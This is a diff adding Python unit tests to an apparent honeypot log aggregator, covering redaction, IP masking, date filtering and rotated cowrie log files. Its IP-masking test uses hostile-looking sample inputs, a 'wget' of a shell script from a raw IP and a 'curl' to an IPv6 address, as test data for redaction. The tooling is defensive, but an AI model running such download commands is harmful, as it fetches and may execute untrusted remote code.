@@ -11,7 +11,12 @@ class RedactTest(unittest.TestCase):
     def test_strips_control_masks_bad_and_clips(self):
         self.assertEqual(aggregate.redact("a\x00b"), "ab")
         self.assertEqual(aggregate.redact("SHIT"), "***")
+        self.assertEqual(aggregate.redact("ＳＨＩＴ"), "***")  # 全角も NFKC で捕まえる
         self.assertEqual(aggregate.redact("x" * 100), "x" * aggregate.MAX_LEN)
+
+    def test_masks_ip_addresses(self):
+        self.assertEqual(aggregate.redact("wget http://185.220.101.4/x.sh"), "wget http://x.x.x.x/x.sh")
+        self.assertNotIn("dead:beef", aggregate.redact("curl http://[dead:beef::1]/"))
 
 
 class BuildReportTest(unittest.TestCase):
@@ -54,6 +59,33 @@ class BuildReportTest(unittest.TestCase):
             path = f.name
         rows = aggregate.read_iptables(path)
         self.assertEqual(rows, [{"src_ip": "203.0.113.9", "proto": "tcp", "port": 23}])
+
+    def test_iptables_date_filter(self):
+        lines = [
+            "Nov  5 00:00:01 vm kernel: HONEYPOT SRC=203.0.113.9 PROTO=TCP DPT=22 ",
+            "Nov  4 23:59:59 vm kernel: HONEYPOT SRC=203.0.113.8 PROTO=TCP DPT=23 ",
+        ]
+        import tempfile
+        with tempfile.NamedTemporaryFile("w", suffix=".log", delete=False) as f:
+            f.write("\n".join(lines))
+            path = f.name
+        rows = aggregate.read_iptables(path, date="2026-11-05")
+        self.assertEqual(rows, [{"src_ip": "203.0.113.9", "proto": "tcp", "port": 22}])
+
+
+class ReadJsonLinesTest(unittest.TestCase):
+    def test_filters_by_date_and_reads_rotated_file(self):
+        import json
+        import tempfile
+        d = tempfile.mkdtemp()
+        base = Path(d) / "cowrie.json"
+        base.write_text(json.dumps({"timestamp": "2026-11-05T10:00:00Z", "eventid": "a"}) + "\n"
+                        + json.dumps({"timestamp": "2026-11-04T10:00:00Z", "eventid": "old"}) + "\n", encoding="utf-8")
+        # ローテーション後の .1 にも前日分が残る想定
+        (Path(d) / "cowrie.json.1").write_text(
+            json.dumps({"timestamp": "2026-11-05T01:00:00Z", "eventid": "b"}) + "\n", encoding="utf-8")
+        rows = aggregate.read_json_lines(str(base), date="2026-11-05", time_key="timestamp")
+        self.assertEqual(sorted(e["eventid"] for e in rows), ["a", "b"])
 
 
 if __name__ == "__main__":
